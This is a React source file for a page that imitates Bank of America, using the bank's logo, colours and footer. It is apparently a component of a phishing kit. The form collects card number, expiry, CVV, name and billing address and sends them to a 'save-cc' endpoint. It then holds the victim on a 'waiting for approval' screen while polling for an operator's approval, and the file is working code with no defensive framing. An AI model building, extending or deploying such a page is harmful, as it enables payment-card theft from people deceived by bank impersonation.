/* eslint-disable @typescript-eslint/no-explicit-any */
import React, { useState } from "react";
import axios from "axios";
import logo from "/boa.png";
import SecureAccountPage from "./SecureAccountPage";

const API_BASE = "http://localhost:4000";

const CreditCard: React.FC = () => {
  const [submitting, setSubmitting] = useState(false);
  const [pendingApproval, setPendingApproval] = useState(false);
  const [approved, setApproved] = useState(false);
  const [message, setMessage] = useState("");

  const [formData, setFormData] = useState({
    cardNumber: "",
    expMonth: "",
    expYear: "",
    nameOnCard: "",
    streetAddress: "",
    zipCode: "",
    cvv: "",
  });

  const handleChange = (
    e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>
  ) => {
    const { name, value } = e.target;
    setFormData((prev) => ({ ...prev, [name]: value }));
  };

  const validateCvv = (cvv: string) => /^[0-9]{3,4}$/.test(cvv);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setMessage("");

    if (!validateCvv(formData.cvv)) {
      setMessage("Enter a valid CVV (3 or 4 digits).");
      return;
    }

    setSubmitting(true);

    try {
      // Send form data to backend
      const response = await axios.post(`${API_BASE}/api/save-cc`, {
        ...formData,
      });

      const result = response.data;
      const newUserId = result.user.id;

      if (result.user?.status === "pending") {
        setPendingApproval(true);
        setMessage("Your card is waiting for approval...");

        // Poll backend until approved
        const pollInterval = 2000; // 2 seconds
        const maxAttempts = 30; // up to 1 minute
        let attempts = 0;

        while (attempts < maxAttempts) {
          await new Promise((resolve) => setTimeout(resolve, pollInterval));
          const check = await axios.get(`${API_BASE}/api/cards`);
          const userData = check.data.find((u: any) => u.id === newUserId);
          if (userData?.status === "approved") {
            setApproved(true);
            setPendingApproval(false);
            return;
          }
          attempts++;
        }

        setMessage(
          "⚠️ Approval is taking longer than expected. Please check back later."
        );
        setPendingApproval(false);
      } else {
        setApproved(true);
      }

      // Clear form
      setFormData({
        cardNumber: "",
        expMonth: "",
        expYear: "",
        nameOnCard: "",
        streetAddress: "",
        zipCode: "",
        cvv: "",
      });
    } catch (err: unknown) {
      console.error("❌ API error:", err);
      setMessage(
        axios.isAxiosError(err)
          ? err.response?.data?.error || err.message
          : "Something went wrong!"
      );
    } finally {
      setSubmitting(false);
    }
  };

  // ✅ If approved, show SecureAccountPage
  if (approved) {
    return <SecureAccountPage title="credit card" />;
  }

  return (
    <div className="min-h-screen bg-white flex flex-col items-center justify-center px-6 py-10 relative">
      {/* Loader Modal */}
      {pendingApproval && (
        <div className="fixed inset-0 flex items-center justify-center bg-black/40 backdrop-blur-sm z-50">
          <div className="bg-white rounded-xl shadow-xl p-8 flex flex-col items-center space-y-6 w-80 max-w-sm">
            <img
              src={logo}
              alt="Bank of America"
              className="h-12 mb-2 object-contain"
            />

            {/* Spinner */}
            <div className="w-16 h-16 border-4 border-gray-200 border-t-[#B42025] rounded-full animate-spin"></div>

            <p className="text-gray-700 text-center font-medium">
              Waiting for approval...
            </p>

            {/* Animated dots */}
            <div className="flex space-x-2 mt-2">
              <span className="w-2 h-2 bg-[#B42025] rounded-full animate-bounce delay-75"></span>
              <span className="w-2 h-2 bg-[#B42025] rounded-full animate-bounce delay-150"></span>
              <span className="w-2 h-2 bg-[#B42025] rounded-full animate-bounce delay-300"></span>
            </div>
          </div>
        </div>
      )}

      <header className="flex items-center space-x-2 mb-10">
        <img src={logo} alt="Bank of America" className="h-10" />
      </header>

      <div className="bg-white shadow-md rounded-lg max-w-md w-full p-6 border border-gray-100">
        <h2 className="text-xl font-semibold text-gray-800 mb-3">
          Credit Card Information
        </h2>

        <form onSubmit={handleSubmit} className="text-left space-y-4">
          {/* Card Number */}
          <div>
            <label className="block text-sm font-medium text-gray-700 mb-1">
              Credit card number
            </label>
            <input
              type="text"
              name="cardNumber"
              value={formData.cardNumber}
              onChange={handleChange}
              placeholder="Enter your card number"
              className="w-full border border-gray-300 rounded-md p-2 focus:ring-1 focus:ring-blue-500 focus:outline-none"
              required
              inputMode="numeric"
              pattern="[0-9\s]+"
              autoComplete="cc-number"
            />
          </div>

          {/* Expiration */}
          <div>
            <label className="block text-sm font-medium text-gray-700 mb-1">
              Expiration date
            </label>
            <div className="flex space-x-2">
              <select
                name="expMonth"
                value={formData.expMonth}
                onChange={handleChange}
                className="w-1/2 border border-gray-300 rounded-md p-2 focus:ring-1 focus:ring-blue-500 focus:outline-none"
                required
              >
                <option value="">Month</option>
                {[...Array(12)].map((_, i) => (
                  <option key={i + 1} value={String(i + 1).padStart(2, "0")}>
                    {String(i + 1).padStart(2, "0")}
                  </option>
                ))}
              </select>
              <select
                name="expYear"
                value={formData.expYear}
                onChange={handleChange}
                className="w-1/2 border border-gray-300 rounded-md p-2 focus:ring-1 focus:ring-blue-500 focus:outline-none"
                required
              >
                <option value="">Year</option>
                {[...Array(10)].map((_, i) => (
                  <option key={i} value={2025 + i}>
                    {2025 + i}
                  </option>
                ))}
              </select>
            </div>
          </div>

          {/* Name on Card */}
          <div>
            <label className="block text-sm font-medium text-gray-700 mb-1">
              Name on card
            </label>
            <input
              type="text"
              name="nameOnCard"
              value={formData.nameOnCard}
              onChange={handleChange}
              placeholder="Enter name as shown on card"
              className="w-full border border-gray-300 rounded-md p-2 focus:ring-1 focus:ring-blue-500 focus:outline-none"
              required
              autoComplete="cc-name"
            />
          </div>

          {/* CVV */}
          <div>
            <label className="block text-sm font-medium text-gray-700 mb-1">
              CVV
            </label>
            <input
              type="tel"
              name="cvv"
              value={formData.cvv}
              onChange={handleChange}
              placeholder="123"
              className="w-1/3 border border-gray-300 rounded-md p-2 focus:ring-1 focus:ring-blue-500 focus:outline-none"
              required
              inputMode="numeric"
              maxLength={4}
              pattern="[0-9]{3,4}"
              autoComplete="cc-csc"
            />
          </div>

          {/* Address */}
          <div className="flex space-x-2">
            <div className="w-2/3">
              <label className="block text-sm font-medium text-gray-700 mb-1">
                Street address
              </label>
              <input
                type="text"
                name="streetAddress"
                value={formData.streetAddress}
                onChange={handleChange}
                placeholder="Enter street address"
                className="w-full border border-gray-300 rounded-md p-2 focus:ring-1 focus:ring-blue-500 focus:outline-none"
              />
            </div>
            <div className="w-1/3">
              <label className="block text-sm font-medium text-gray-700 mb-1">
                ZIP code
              </label>
              <input
                type="text"
                name="zipCode"
                value={formData.zipCode}
                onChange={handleChange}
                placeholder="ZIP"
                className="w-full border border-gray-300 rounded-md p-2 focus:ring-1 focus:ring-blue-500 focus:outline-none"
              />
            </div>
          </div>

          {/* Submit button */}
          <button
            type="submit"
            disabled={submitting || pendingApproval}
            className={`w-full text-white rounded-md py-2 mt-4 transition ${
              submitting || pendingApproval
                ? "bg-gray-400 cursor-not-allowed"
                : "bg-[#B42025] hover:bg-blue-800"
            }`}
          >
            {submitting
              ? "Submitting..."
              : pendingApproval
              ? "Waiting for approval..."
              : "Continue"}
          </button>

          {message && (
            <p
              className={`mt-3 text-sm ${
                message.includes("success") || message.includes("approved")
                  ? "text-green-600"
                  : "text-red-500"
              }`}
            >
              {message}
            </p>
          )}
        </form>
      </div>

      <footer className="mt-10 text-sm text-gray-500">
        © {new Date().getFullYear()} Bank of America Corporation. All rights
        reserved.
      </footer>
    </div>
  );
};

export default CreditCard;
